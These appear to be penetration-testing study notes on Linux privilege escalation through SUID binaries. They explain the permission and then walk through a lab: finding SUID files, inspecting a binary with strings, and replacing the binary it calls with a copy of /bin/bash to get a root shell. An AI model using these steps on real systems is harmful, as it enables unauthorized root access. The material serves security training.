# C - Exploiting SUID Binaries.

## **Exploiting SUID Binaries**

* In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.
* When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
* SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with “root” permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the scripts and does not translate to elevation of privileges, however, if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.
* This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:
  * **Owner of the SUID binary** - Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
  * **Access permissions** - We will require executable permissions in order to execute the SUID binary.



## **Practical Demonstration**

After gaining initial foothold on the target system, with an unpriliveged account.

We first have to look for a file created by a privileged user and using SUID permissions.

{% code overflow="wrap" lineNumbers="true" %}
```bash
find / -type f -perm -04000 -ls 2>/dev/null #Check for files with SUID permissions
# There are two: greetings (not allowed) and welcome (allowed)
# welcome permissions: -rwsr-xr-x --> The "s" means that the file with these permissions is using SUID
./welcome # execute the welcome binary.
file welcome # Returns info about the file

type welcome # tells us this is an elf binary file.

strings welcome #Extract strings from a non-human-readable file (like binaries for example)
#We found that welcome executes the greetings binary.
rm greetings # Since the welcome binary executes the greetings binary, we can remove the greetings file, and now replace it with our own file.

cp /bin/bash greetings # Copy the bash terminal to the current folder as a file called greetings.

# when executing welcome, it gives us a privileged bash terminal, because it executes our modufied greetings binary.
./welcome
# and we get a root session.
```
{% endcode %}



